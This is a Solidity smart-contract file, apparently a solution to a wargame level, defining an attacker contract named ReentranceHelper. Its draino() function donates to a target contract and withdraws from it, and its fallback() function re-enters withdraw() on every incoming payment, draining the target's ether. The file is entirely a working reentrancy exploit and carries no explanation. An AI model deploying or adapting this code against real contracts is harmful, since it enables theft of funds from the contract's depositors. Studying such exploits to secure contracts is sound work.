// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
contract ReentranceHelper {
    ReentranceAbstract kingContract;
    constructor(address payable _address) {
        kingContract = ReentranceAbstract(_address);
    }
    function draino() external payable{
        console.log(address(kingContract).balance);
        kingContract.donate{value:  msg.value}(address(this));
        kingContract.withdraw(msg.value);
    }
    fallback() external payable{
        kingContract.withdraw(msg.value);
    }
}
abstract contract ReentranceAbstract {

  mapping(address => uint) public balances;

  function withdraw(uint _amount) virtual public;

  function donate(address _to) virtual public payable;
}